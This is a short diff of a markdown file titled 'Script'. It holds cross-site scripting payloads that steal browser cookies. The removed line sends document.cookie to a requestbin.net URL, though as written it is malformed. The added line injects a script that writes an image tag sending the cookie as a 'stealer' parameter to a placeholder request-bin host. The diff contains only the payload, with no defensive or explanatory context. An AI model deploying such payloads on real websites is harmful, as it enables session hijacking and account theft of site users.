@@ -2,8 +2,7 @@
 # Script 
 
 ```javascript
-<img src="http://requestbin.net/r/zacnyyza?PARAMSPECIAL2=".concat(document.cookie)/>
-<script> document.write("Hello World!"); </script>
+<script>document.write('<img src=\"URLREQUESTBIN?stealer='+document.cookie+'\"');</script>
 
 ```
 
